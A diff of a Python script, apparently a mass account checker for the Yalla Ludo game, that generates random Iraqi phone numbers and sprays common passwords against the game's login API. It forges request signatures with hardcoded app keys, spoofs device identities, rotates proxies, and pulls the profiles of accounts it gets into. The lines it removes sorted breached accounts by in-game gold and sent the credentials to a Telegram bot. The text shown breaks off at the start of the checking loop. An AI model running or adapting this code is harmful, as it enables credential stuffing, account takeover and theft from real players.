@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Yalla Ludo - Iraq Mass Checker (Automatic)
+# Yalla Ludo - Iraq Number Checker (نسخة متقدمة مع Dashboard + 1000 Thread)
 # By @to_ls
 
 import base64
@@ -10,7 +10,6 @@ import hmac
 import time
 import uuid
 import random
-import string
 import asyncio
 import aiohttp
 import sys
@@ -18,8 +17,9 @@ import os
 import threading
 from collections import defaultdict
 from datetime import datetime
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding as padlib
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 try:
     from rich.console import Console
@@ -43,402 +43,37 @@ except:
         })()
 
 # ============================================================
-# CONFIGURATION
+# CONFIG
 # ============================================================
 VER = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
 VERH = "1.4.9.2"
+SPRE = "2.0_2_"
 L3 = "L3)qk*@8"
-K = "8a9520f016427a54d5de40335bf7e4fe"
-K2 = "c889f8f7dc69b1d67e1d3e43cf48f430"
 MKEY = b"4e82797b276c5cb729db62aaa229a057"
 MIV = b"0102030405060708"
+K = "8a9520f016427a54d5de40335bf7e4fe"
 HERA = "f580270da66e44438d5ed30fdb08ebba"
-SPRE = "2.0_2_"
 
-# CONSTANT - IRAQ AREA CODE
-AREA_CODE = 964
-
-# PATHS
 LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
 PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
-TIMEOUT = 0.1
+TIMEOUT = 15
 
-# SERVERS
-LOGIN_SERVERS = [
-    "https://httpgateway.lampjkl.com",
-    "https://httpgateway.yalla.games",
-    "https://httpgateway.carrstuv.com",
-    "https://httpgateway.funcdeg.com",
-    "https://httpgateway.planecde.com",
+# ============================================================
+# DOMAINS
+# ============================================================
+DOMAINS = [
+    "httpgateway.lampjkl.com",
+    "httpgateway.carrstuv.com",
+    "httpgateway.funcdeg.com",
+    "httpgateway.planecde.com",
+    "httpgateway.yalla.games",
+    "httpgateway.foodjkl.com",
+    "httpgateway.penabcd.com",
+    "pay.lampjkl.com",
 ]
 
-PROFILE_SERVERS = [
-    "https://httpgateway.lampjkl.com",
-    "https://httpgateway.planecde.com",
-    "https://httpgateway.funcdeg.com",
-    "https://httpgateway.carrstuv.com",
-    "https://httpgateway.yalla.games",
-]
-
-# Telegram Config
-BOT_TOKEN = ""
-CHAT_IDS = []
-PROXY_FILE = ""
-
-# ============================================================
-# PASSWORDS & NUMBERS CONFIG
-# ============================================================
-PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
-
-PREFIXES = {
-    "اسيا": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"],
-    "زين": ["780", "781", "782", "783", "784", "785", "786", "787", "788", "789"],
-    "كورك": ["790", "791", "792", "793", "794", "795", "796", "797", "798", "799"]
-}
-
-def generate_mobile_by_company(company=None):
-    if company and company in PREFIXES:
-        prefix = random.choice(PREFIXES[company])
-    else:
-        all_prefixes = []
-        for p in PREFIXES.values():
-            all_prefixes.extend(p)
-        prefix = random.choice(all_prefixes)
-    suffix = ''.join(random.choices('0123456789', k=7))
-    return prefix + suffix
-
-used_numbers = set()
-used_lock = threading.Lock()
-
-def generate_mobile_iq():
-    while True:
-        company = random.choice(list(PREFIXES.keys()))
-        mobile = generate_mobile_by_company(company)
-        with used_lock:
-            if mobile not in used_numbers:
-                used_numbers.add(mobile)
-                return mobile
-
-# ============================================================
-# SAVE FUNCTIONS
-# ============================================================
-def save_account_by_gold(account):
-    gold = account.get('gold', 0)
-    phone = account['phone']
-    password = account['password']
-    
-    if gold < 1000000:
-        filename = "gold_0_1M.txt"
-    elif gold < 5000000:
-        filename = "gold_1M_5M.txt"
-    elif gold < 10000000:
-        filename = "gold_5M_10M.txt"
-    elif gold < 50000000:
-        filename = "gold_10M_50M.txt"
-    elif gold < 100000000:
-        filename = "gold_50M_100M.txt"
-    else:
-        filename = "gold_100M_plus.txt"
-    
-    try:
-        with open(filename, 'a', encoding='utf-8') as f:
-            f.write(f"{phone}:{password}\n")
-        return filename
-    except Exception as e:
-        return None
-
-def save_account_full_by_gold(account):
-    gold = account.get('gold', 0)
-    filename = "good_accounts_full.txt"
-    
-    try:
-        with open(filename, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
-        return True
-    except Exception as e:
-        return False
-
-def save_account_to_file(account, filepath):
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(f"{account['phone']}:{account['password']}\n")
-        return True
-    except Exception as e:
-        return False
-
-# ============================================================
-# CRYPTO FUNCTIONS
-# ============================================================
-def _aes_cbc(key, iv, pt):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return cipher.encrypt(pad(pt, 16))
-
-def _xor_b64(data_str, key_str):
-    kb = key_str.encode()
-    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
-    return base64.b64encode(xo).decode()
-
-def _xor_decrypt(raw, key_str):
-    kb = key_str.encode()
-    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))
-
-def _gen_shu():
-    raw = uuid.uuid4().bytes + uuid.uuid4().bytes[:8]
-    return base64.b64encode(raw).decode().replace("+", "-").replace("/", "_").rstrip("=")[:36]
-
-def _gen_dev():
-    device_id = str(uuid.uuid4())
-    android_id = uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16]
-    shumeng = _gen_shu()
-    nonce = f"{random.randint(0, 2**31-1)}_{uuid.uuid4()}"
-    return device_id, android_id, shumeng, nonce
-
-def _gen_traceparent():
-    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:16]}-00"
-
-# ============================================================
-# HOST CONFIG
-# ============================================================
-HCONF = [
-    {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
-    {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
-    {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.lampjkl.com", "type": 2, "version": 17},
-    {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 20},
-    {"bizType": 2006, "countryCode": "IQ", "hostUrl": "https://nitrogen.lampjkl.com", "type": 2, "version": 19},
-    {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
-]
-
-# ============================================================
-# BUILD LOGIN
-# ============================================================
-def build_login(mobile, password_md5, area_code=AREA_CODE):
-    now = int(time.time() * 1000)
-    device_id, android_id, shumeng, nonce = _gen_dev()
-    
-    bag = {
-        "timeSpan": str(now),
-        "version": VERH,
-        "deviceId": device_id,
-        "deviceName": "samsung Galaxy S24 Ultra",
-        "deviceType": 2,
-        "downloadChannelId": 1,
-        "shuMengId": shumeng,
-        "nonce": nonce,
-        "plateType": 0,
-        "LanguageId": 2,
-        "phoneModel": "SM-S928B",
-        "X-Phone-Country": "IQ",
-        "X-Sim-Country": "IQ",
-        "AndroidId": android_id,
-        "appType": 0,
-    }
-    bag_b64 = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-    
-    sign_data = LOGIN_PATH + VER + bag_b64
-    sig = hmac.new(K.encode(), sign_data.encode(), hashlib.sha256).hexdigest()
-    xsign = SPRE + sig
-    
-    medusa_pt = f'{hashlib.md5(sign_data.encode()).hexdigest()}-{len(sign_data)}-{K}-{L3}'.encode()
-    xmedusa = base64.b64encode(_aes_cbc(MKEY, MIV, medusa_pt)).decode()
-
-    body = {
-        "mobile": mobile,
-        "areaCode": area_code,
-        "password": password_md5,
-        "languageId": 2,
-        "nationalityId": 1,
-        "hostConfig": HCONF,
-        "simCountry": "IQ",
-        "version": VERH,
-        "deviceId": device_id,
-        "deviceName": "samsung Galaxy S24 Ultra",
-        "deviceType": 2,
-        "downloadChannelId": 1,
-        "shuMengId": shumeng,
-        "nonce": nonce,
-        "plateType": 0,
-        "phoneModel": "SM-S928B",
-        "X-Phone-Country": "IQ",
-        "X-Sim-Country": "IQ",
-        "AndroidId": android_id,
-        "IsSubpackages": 0,
-        "appType": 0,
-    }
-    body_json = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
-    param = _xor_b64(body_json, K)
-    payload = {"paramJsonString": param}
-    
-    headers = {
-        "User-Agent": VER,
-        "UserId": "0",
-        "X-App-Id": "ludo",
-        "X-Baggage": bag_b64,
-        "X-Access-Token": "",
-        "X-Timestamp": str(now),
-        "versionString": VERH,
-        "X-Sign": xsign,
-        "X-Hera": HERA,
-        "X-Time": str(now + random.randint(30, 60)),
-        "X-Medusa": xmedusa,
-        "Content-Type": "application/json; charset=utf-8",
-        "Accept-Encoding": "gzip",
-        "Connection": "Keep-Alive",
-        "traceparent": _gen_traceparent(),
-        "baggage": "service.name=ludo",
-    }
-    
-    dev = {"deviceId": device_id, "AndroidId": android_id, "shuMengId": shumeng, "nonce": nonce}
-    return headers, payload, dev
-
-# ============================================================
-# BUILD PROFILE
-# ============================================================
-def build_profile(token, user_id, dev):
-    now = int(time.time() * 1000)
-    nonce = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
-    bag_sign = hashlib.md5((K + nonce).encode()).hexdigest().upper()
-    
-    bag = {
-        "token": token,
-        "sign": bag_sign,
-        "timeSpan": str(now),
-        "version": VERH,
-        "deviceId": dev["deviceId"],
-        "deviceName": "samsung Galaxy S24 Ultra",
-        "deviceType": 2,
-        "downloadChannelId": 1,
-        "shuMengId": dev["shuMengId"],
-        "nonce": nonce,
-        "plateType": 0,
-        "LanguageId": 2,
-        "phoneModel": "SM-S928B",
-        "X-Phone-Country": "IQ",
-        "X-Sim-Country": "IQ",
-        "AndroidId": dev["AndroidId"],
-        "appType": 0,
-    }
-    bag_b64 = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-    
-    sign_data = PROFILE_PATH + token + VER + bag_b64
-    sig = hmac.new(K.encode(), sign_data.encode(), hashlib.sha256).hexdigest()
-    xsign = SPRE + sig
-    
-    medusa_pt = f'{hashlib.md5(sign_data.encode()).hexdigest()}-{len(sign_data)}-{K}-{L3}'.encode()
-    xmedusa = base64.b64encode(_aes_cbc(MKEY, MIV, medusa_pt)).decode()
-    
-    body = {"accountId": int(user_id)}
-    body_json = json.dumps(body, separators=(",", ":"))
-    param = _xor_b64(body_json, K)
-    
-    headers = {
-        "User-Agent": VER,
-        "UserId": user_id,
-        "X-App-Id": "ludo",
-        "X-Baggage": bag_b64,
-        "X-Access-Token": token,
-        "X-Timestamp": str(now + random.randint(50, 300)),
-        "versionString": VERH,
-        "X-Sign": xsign,
-        "X-Hera": HERA,
-        "X-Time": str(now + random.randint(50, 300)),
-        "X-Medusa": xmedusa,
-        "Content-Type": "application/json; charset=utf-8",
-        "Accept-Encoding": "gzip",
-    }
-    
-    return headers, {"paramJsonString": param}
-
-# ============================================================
-# LOGIN & PROFILE
-# ============================================================
-async def login_account(session, mobile, password_md5, area_code=AREA_CODE, proxy=None):
-    for server in LOGIN_SERVERS:
-        try:
-            headers, payload, dev = build_login(mobile, password_md5, area_code)
-            url = server + LOGIN_PATH
-            
-            async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-                if r.status != 200:
-                    continue
-                
-                data = await r.json()
-                param = data.get("paramJsonString", "")
-                if param:
-                    raw = base64.b64decode(param)
-                    decrypted = _xor_decrypt(raw, K)
-                    result = json.loads(decrypted.decode('utf-8'))
-                else:
-                    result = data
-                
-                if result.get("status") == 0:
-                    user_data = result.get("data", {})
-                    token = user_data.get("token", "")
-                    user_id = str(user_data.get("id", user_data.get("showNumId", "")))
-                    
-                    if token and user_id:
-                        profile = await fetch_profile(session, token, user_id, dev, proxy)
-                        return {
-                            "success": True,
-                            "data": user_data,
-                            "token": token,
-                            "user_id": user_id,
-                            "dev": dev,
-                            "profile": profile
-                        }
-                    else:
-                        return {"success": True, "data": user_data, "token": token, "user_id": user_id, "dev": dev, "profile": None}
-                else:
-                    return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
-                    
-        except Exception as e:
-            continue
-    
-    return {"success": False, "error": "All servers failed"}
-
-async def fetch_profile(session, token, user_id, dev, proxy=None):
-    if not token or not user_id:
-        return None
-    
-    for server in PROFILE_SERVERS:
-        try:
-            headers, payload = build_profile(token, user_id, dev)
-            url = server + PROFILE_PATH
-            
-            async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-                if r.status in (403, 500, 404):
-                    continue
-                
-                data = await r.json()
-                param = data.get("paramJsonString", "")
-                if param:
-                    raw = base64.b64decode(param)
-                    decrypted = _xor_decrypt(raw, K)
-                    result = json.loads(decrypted.decode('utf-8'))
-                else:
-                    result = data
-                
-                if result.get("status") == 0:
-                    return result.get("data", {})
-                    
-        except Exception:
-            continue
-    
-    return None
-
-# ============================================================
-# STATISTICS
-# ============================================================
-stats = defaultdict(int)
-gold_stats = defaultdict(int)
-diamond_stats = defaultdict(int)
-level_stats = defaultdict(int)
-vip_stats = defaultdict(int)
-found_accounts = []
-verify_accounts = []
-stats_lock = threading.Lock()
-stop_flag = False
-start_time = time.time()
+LOGIN_SERVERS = [f"https://{domain}" for domain in DOMAINS]
+PROFILE_SRVS = [f"https://{domain}" for domain in DOMAINS]
 
 # ============================================================
 # PROXY MANAGER
@@ -450,30 +85,31 @@ class ProxyManager:
         self.failed_proxies = set()
         self.proxy_lock = threading.Lock()
         self.current_index = 0
-        if proxy_file:
+        self.use_proxies = False
+        if proxy_file and os.path.exists(proxy_file):
             self.load_proxies(proxy_file)
     
     def load_proxies(self, proxy_file):
         try:
-            if os.path.exists(proxy_file):
-                with open(proxy_file, 'r') as f:
-                    for line in f:
-                        line = line.strip()
-                        if line:
-                            proxy = self._parse_proxy(line)
-                            if proxy:
-                                self.proxies.append(proxy)
-                self._print(f"[green][+][/green] Loaded {len(self.proxies)} proxies")
-            else:
-                self._print(f"[yellow][!][/yellow] Proxy file not found: {proxy_file}")
+            with open(proxy_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line:
+                        # دعم صيغ متعددة
+                        if '://' in line:
+                            line = line.split('://')[1]
+                        self.proxies.append(line)
+            if self.proxies:
+                self.use_proxies = True
+                if RICH_AVAILABLE:
+                    console.print(f"[green][+][/green] Loaded {len(self.proxies)} proxies")
+                else:
+                    print(f"[+] Loaded {len(self.proxies)} proxies")
         except Exception as e:
-            self._print(f"[red][-][/red] Error loading proxies: {e}")
-    
-    def _print(self, msg):
-        if RICH_AVAILABLE:
-            console.print(msg)
-        else:
-            print(msg)
+            if RICH_AVAILABLE:
+                console.print(f"[red][-][/red] Error loading proxies: {e}")
+            else:
+                print(f"[-] Error loading proxies: {e}")
     
     def _parse_proxy(self, line):
         if '@' in line:
@@ -492,151 +128,346 @@ class ProxyManager:
         return None
     
     def get_proxy(self):
+        if not self.use_proxies or not self.proxies:
+            return None
+        
         with self.proxy_lock:
+            # تجربة بروكسي شغال أولاً
             if self.working_proxies:
                 proxy = random.choice(self.working_proxies)
-                return self._format_proxy(proxy)
-            if self.proxies:
-                for _ in range(5):
-                    proxy = self.proxies[self.current_index % len(self.proxies)]
-                    self.current_index += 1
-                    proxy_str = self._format_proxy(proxy)
-                    if proxy_str not in self.failed_proxies:
-                        return proxy_str
+                return proxy
+            
+            # جلب بروكسي جديد
+            for _ in range(10):
                 proxy = self.proxies[self.current_index % len(self.proxies)]
                 self.current_index += 1
-                return self._format_proxy(proxy)
-            return None
-    
-    def _format_proxy(self, proxy):
-        if isinstance(proxy, dict):
-            if proxy.get('user') and proxy.get('pass'):
-                return f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
-            return f"http://{proxy['ip']}:{proxy['port']}"
-        return proxy
+                if proxy not in self.failed_proxies:
+                    return proxy
+            
+            # إذا كلهم فشلوا، نرجع أي بروكسي
+            proxy = self.proxies[self.current_index % len(self.proxies)]
+            self.current_index += 1
+            return proxy
     
     def mark_working(self, proxy_str):
+        if not proxy_str:
+            return
         with self.proxy_lock:
-            if proxy_str and proxy_str not in self.working_proxies:
+            if proxy_str not in self.working_proxies:
                 self.working_proxies.append(proxy_str)
                 if proxy_str in self.failed_proxies:
                     self.failed_proxies.remove(proxy_str)
     
     def mark_failed(self, proxy_str):
+        if not proxy_str:
+            return
         with self.proxy_lock:
-            if proxy_str:
-                self.failed_proxies.add(proxy_str)
-                if proxy_str in self.working_proxies:
-                    self.working_proxies.remove(proxy_str)
+            self.failed_proxies.add(proxy_str)
+            if proxy_str in self.working_proxies:
+                self.working_proxies.remove(proxy_str)
+    
+    def get_stats(self):
+        with self.proxy_lock:
+            return {
+                "total": len(self.proxies),
+                "working": len(self.working_proxies),
+                "failed": len(self.failed_proxies)
+            }
 
-proxy_manager = None
+proxy_manager = ProxyManager("/storage/emulated/0/Download/Telegram/proxyscrape_premium_http_proxies.txt")
 
 # ============================================================
-# TELEGRAM SEND
+# CRYPTO FUNCTIONS
 # ============================================================
-async def send_telegram_async(session, phone, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time):
-    if not BOT_TOKEN or not CHAT_IDS:
-        return False
-    
-    message = f"""✅ Yalla Ludo Hit!
+def _aes_cbc(key, iv, pt):
+    pad = padlib.PKCS7(128).padder()
+    pt2 = pad.update(pt) + pad.finalize()
+    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    e = c.encryptor()
+    return e.update(pt2) + e.finalize()
 
-📱 {phone} | 🔑 {pwd}
-👤 {name} | 🆔 {uid}
-💰 {gold:,} | 💎 {diamond:,} | 📊 {level}"""
+def _xor_b64(data_str, key_str):
+    kb = key_str.encode()
+    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
+    return base64.b64encode(xo).decode()
+
+def _xor_decrypt(raw, key_str):
+    kb = key_str.encode()
+    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))
+
+def _gen_shu():
+    import secrets
+    raw = secrets.token_bytes(28)
+    return base64.b64encode(raw).decode().replace("+","-").replace("/","_").rstrip("=")[:38]
+
+def _rdev():
+    devs = [
+        ("OnePlus 9 Pro", "LE2123", "IQ", "IQ", 2),
+        ("Samsung Galaxy S21", "SM-G991B", "IQ", "IQ", 2),
+        ("Xiaomi Mi 11", "M2011K2G", "IQ", "IQ", 2),
+        ("Oppo Reno 6", "CPH2235", "IQ", "IQ", 2),
+        ("Samsung Galaxy A52", "SM-A525F", "IQ", "IQ", 2),
+        ("Huawei P40 Pro", "ELS-NX9", "IQ", "IQ", 2),
+    ]
+    nm, md, pc, sc, dt = random.choice(devs)
+    return {
+        "deviceId": str(uuid.uuid4()),
+        "deviceName": f"{nm.split()[0].lower()} {md}",
+        "deviceType": dt,
+        "phoneModel": md,
+        "X-Phone-Country": pc,
+        "X-Sim-Country": sc,
+        "downloadChannelId": 1,
+        "shuMengId": _gen_shu(),
+        "AndroidId": uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
+        "plateType": 0,
+        "LanguageId": 2,
+        "appType": 0,
+    }
+
+def _gen_traceparent():
+    return f"00-{uuid.uuid4().hex+uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"
+
+# ============================================================
+# BUILD REQUESTS
+# ============================================================
+def _build_login(mobile, password, area_code):
+    d = _rdev()
+    now = int(time.time() * 1000)
+    nc = f"{random.randint(0, 2**31-1)}_{uuid.uuid4()}"
+
+    bag = {
+        "timeSpan": str(now), "version": VERH,
+        "deviceId": d["deviceId"], "deviceName": d["deviceName"],
+        "deviceType": d["deviceType"], "downloadChannelId": d["downloadChannelId"],
+        "shuMengId": d["shuMengId"], "nonce": nc,
+        "plateType": d["plateType"], "LanguageId": d["LanguageId"],
+        "phoneModel": d["phoneModel"], "X-Phone-Country": d["X-Phone-Country"],
+        "X-Sim-Country": d["X-Sim-Country"], "AndroidId": d["AndroidId"],
+        "appType": d["appType"],
+    }
+    bb = base64.b64encode(
+        json.dumps(bag, separators=(",",":"), ensure_ascii=False).encode()
+    ).decode()
+
+    sg = LOGIN_PATH + VER + bb
+    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
+    xs = SPRE + sig
+    p = hashlib.md5(sg.encode()).hexdigest()
+    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
+    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()
+
+    phex = hashlib.md5(password.encode()).hexdigest().upper()
+    body = {
+        "mobile": mobile, "areaCode": area_code, "password": phex,
+        "languageId": d["LanguageId"], "nationalityId": 1,
+        "hostConfig": [
+            {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.moonlmn.com", "type": 2, "version": 4},
+            {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
+            {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 20},
+        ],
+        "simCountry": "", "version": VERH,
+        "deviceId": d["deviceId"], "deviceName": d["deviceName"],
+        "deviceType": d["deviceType"], "downloadChannelId": d["downloadChannelId"],
+        "shuMengId": d["shuMengId"], "nonce": nc, "plateType": d["plateType"],
+        "phoneModel": d["phoneModel"], "X-Phone-Country": d["X-Phone-Country"],
+        "X-Sim-Country": d["X-Sim-Country"], "AndroidId": d["AndroidId"],
+        "IsSubpackages": 0, "appType": d["appType"],
+    }
+    bs = json.dumps(body, separators=(",",":"), ensure_ascii=False).replace("/", "\\/")
+    pm = _xor_b64(bs, K)
+
+    ts = now + random.randint(40, 80)
+    hd = {
+        "User-Agent": VER, "UserId": "0", "X-App-Id": "ludo",
+        "X-Baggage": bb, "X-Access-Token": "",
+        "X-Timestamp": str(ts), "versionString": VERH,
+        "X-Sign": xs, "X-Hera": HERA,
+        "X-Time": str(ts + random.randint(30, 60)),
+        "X-Medusa": xm,
+        "Content-Type": "application/json; charset=utf-8",
+        "Accept-Encoding": "gzip",
+        "Connection": "Keep-Alive",
+        "baggage": "service.name=ludo",
+        "traceparent": _gen_traceparent(),
+    }
+    return {"headers": hd, "payload": {"paramJsonString": pm}, "dev": d}
+
+def _build_profile(token, user_id, dev):
+    now = int(time.time() * 1000)
+    nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
+    bag_sign = hashlib.md5((K + nc).encode()).hexdigest().upper()
+
+    bag = {
+        "token": token, "sign": bag_sign, "timeSpan": str(now),
+        "version": VERH, "deviceId": dev["deviceId"], "deviceName": dev["deviceName"],
+        "deviceType": dev["deviceType"], "downloadChannelId": dev["downloadChannelId"],
+        "shuMengId": dev["shuMengId"], "nonce": nc,
+        "plateType": dev["plateType"], "LanguageId": dev["LanguageId"],
+        "phoneModel": dev["phoneModel"], "X-Phone-Country": dev["X-Phone-Country"],
+        "X-Sim-Country": dev["X-Sim-Country"], "AndroidId": dev["AndroidId"],
+        "appType": dev["appType"],
+    }
+    bb = base64.b64encode(
+        json.dumps(bag, separators=(",",":"), ensure_ascii=False).encode()
+    ).decode()
+
+    sg = PROFILE_PATH + token + VER + bb
+    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
+    xs = SPRE + sig
+    p = hashlib.md5(sg.encode()).hexdigest()
+    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
+    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()
+
+    hd = {
+        "User-Agent": VER, "UserId": user_id, "X-App-Id": "ludo",
+        "X-Baggage": bb, "X-Access-Token": token,
+        "X-Timestamp": str(now + random.randint(50, 300)),
+        "versionString": VERH, "X-Sign": xs, "X-Hera": HERA,
+        "X-Time": str(now + random.randint(50, 300)),
+        "X-Medusa": xm,
+        "Content-Type": "application/json; charset=utf-8",
+        "Accept-Encoding": "gzip",
+    }
+    uid_int = int(user_id) if str(user_id).isdigit() else user_id
+    pm = _xor_b64(json.dumps({"accountId": uid_int}, separators=(",",":")), K)
+    return hd, {"paramJsonString": pm}
+
+# ============================================================
+# LOGIN & PROFILE (Async)
+# ============================================================
+async def login_account(session, mobile, password, area_code=964, proxy=None):
+    rq = _build_login(mobile, password, area_code)
     
-    if is_vip:
-        message += f" | 👑 VIP"
-    
-    message += f"\n\nBy @to_ls"
-    
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    all_success = True
-    
-    for chat_id in CHAT_IDS:
-        sent = False
-        for attempt in range(3):
-            try:
-                payload = {
-                    'chat_id': chat_id,
-                    'text': message,
-                    'disable_web_page_preview': True,
-                    'disable_notification': False
-                }
+    for server in LOGIN_SERVERS:
+        try:
+            url = server + LOGIN_PATH
+            
+            async with session.post(url, json=rq["payload"], headers=rq["headers"], 
+                                   proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+                if r.status != 200:
+                    continue
                 
-                async with session.post(url, data=payload, timeout=30) as resp:
-                    if resp.status == 200:
-                        sent = True
-                        break
-                    else:
-                        await asyncio.sleep(2)
-            except Exception as e:
-                await asyncio.sleep(2)
-        
-        if not sent:
-            all_success = False
-    
-    return all_success
-
-async def send_telegram_verify_async(session, phone, pwd, name, uid, reason):
-    if not BOT_TOKEN or not CHAT_IDS:
-        return False
-    
-    message = f"""🔒 حساب مقفول - يحتاج تحقق
-
-📱 الرقم: {phone}
-🔑 الباسورد: {pwd}
-⚠️ الحالة: مقفول تحقق - يحتاج فتح
-
-By @to_ls"""
-    
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    all_success = True
-    
-    for chat_id in CHAT_IDS:
-        sent = False
-        for attempt in range(3):
-            try:
-                payload = {
-                    'chat_id': chat_id,
-                    'text': message,
-                    'disable_web_page_preview': True,
-                    'disable_notification': False
-                }
+                obj = await r.json()
+                param = obj.get("paramJsonString", "")
+                if param:
+                    raw = base64.b64decode(param)
+                    decrypted = _xor_decrypt(raw, K)
+                    result = json.loads(decrypted.decode('utf-8'))
+                else:
+                    result = obj
                 
-                async with session.post(url, data=payload, timeout=30) as resp:
-                    if resp.status == 200:
-                        sent = True
-                        break
+                if result.get("status") == 0:
+                    data = result.get("data") or {}
+                    token = data.get("token", "")
+                    user_id = str(data.get("id", data.get("showNumId", "")))
+                    
+                    if token and user_id:
+                        profile = await fetch_profile(session, token, user_id, rq["dev"], proxy)
+                        return {
+                            "success": True,
+                            "data": data,
+                            "token": token,
+                            "user_id": user_id,
+                            "dev": rq["dev"],
+                            "profile": profile
+                        }
                     else:
-                        await asyncio.sleep(2)
-            except Exception as e:
-                await asyncio.sleep(2)
-        
-        if not sent:
-            all_success = False
+                        return {"success": True, "data": data, "token": token, "user_id": user_id, "dev": rq["dev"], "profile": None}
+                else:
+                    return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
+        except Exception as e:
+            continue
     
-    return all_success
+    return {"success": False, "error": "All servers failed"}
+
+async def fetch_profile(session, token, user_id, dev, proxy=None):
+    if not token or not user_id:
+        return None
+    
+    for server in PROFILE_SRVS:
+        try:
+            hd, body = _build_profile(token, user_id, dev)
+            url = server + PROFILE_PATH
+            
+            async with session.post(url, json=body, headers=hd, proxy=proxy, 
+                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+                if r.status in (403, 500, 404):
+                    continue
+                
+                obj = await r.json()
+                param = obj.get("paramJsonString", "")
+                if param:
+                    raw = base64.b64decode(param)
+                    decrypted = _xor_decrypt(raw, K)
+                    result = json.loads(decrypted.decode('utf-8'))
+                else:
+                    result = obj
+                
+                if result.get("status") == 0:
+                    return result.get("data", {})
+        except Exception:
+            continue
+    
+    return None
+
+# ============================================================
+# PASSWORDS & NUMBERS
+# ============================================================
+PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
+
+PREFIXES = {
+    "اسيا": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"],
+    "زين": ["780", "781", "782", "783", "784", "785", "786", "787", "788", "789"],
+    "كورك": ["790", "791", "792", "793", "794", "795", "796", "797", "798", "799"]
+}
+
+used_numbers = set()
+used_lock = threading.Lock()
+
+def generate_mobile_iq():
+    while True:
+        company = random.choice(list(PREFIXES.keys()))
+        prefix = random.choice(PREFIXES[company])
+        suffix = ''.join(random.choices('0123456789', k=7))
+        mobile = prefix + suffix
+        with used_lock:
+            if mobile not in used_numbers:
+                used_numbers.add(mobile)
+                return mobile
+
+# ============================================================
+# STATISTICS
+# ============================================================
+stats = defaultdict(int)
+gold_stats = defaultdict(int)
+diamond_stats = defaultdict(int)
+level_stats = defaultdict(int)
+vip_stats = defaultdict(int)
+found_accounts = []
+verify_accounts = []
+stats_lock = threading.Lock()
+stop_flag = False
+start_time = time.time()
 
 # ============================================================
 # CHECK NUMBER
 # ============================================================
 async def check_number_async(session, mobile, semaphore, proxy=None):
     global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
+    
     async with semaphore:
         for pwd in PASSWORDS_IQ:
             if stop_flag:
                 return
             
